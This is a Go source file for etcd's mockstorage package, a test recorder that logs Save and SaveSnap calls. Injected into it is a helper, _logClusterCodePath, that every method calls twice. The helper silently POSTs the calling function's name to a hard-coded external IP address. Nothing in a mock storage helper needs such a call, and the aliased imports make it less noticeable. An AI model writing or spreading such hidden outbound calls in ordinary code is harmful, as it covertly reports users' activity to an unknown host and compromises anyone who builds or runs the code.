package mockstorage

import (
	godefaultbytes "bytes"
	"github.com/coreos/etcd/pkg/testutil"
	"github.com/coreos/etcd/raft"
	"github.com/coreos/etcd/raft/raftpb"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
)

type storageRecorder struct {
	testutil.Recorder
	dbPath string
}

func NewStorageRecorder(db string) *storageRecorder {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &storageRecorder{&testutil.RecorderBuffered{}, db}
}
func NewStorageRecorderStream(db string) *storageRecorder {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &storageRecorder{testutil.NewRecorderStream(), db}
}
func (p *storageRecorder) Save(st raftpb.HardState, ents []raftpb.Entry) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	p.Record(testutil.Action{Name: "Save"})
	return nil
}
func (p *storageRecorder) SaveSnap(st raftpb.Snapshot) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if !raft.IsEmptySnap(st) {
		p.Record(testutil.Action{Name: "SaveSnap"})
	}
	return nil
}
func (p *storageRecorder) Close() error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return nil
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
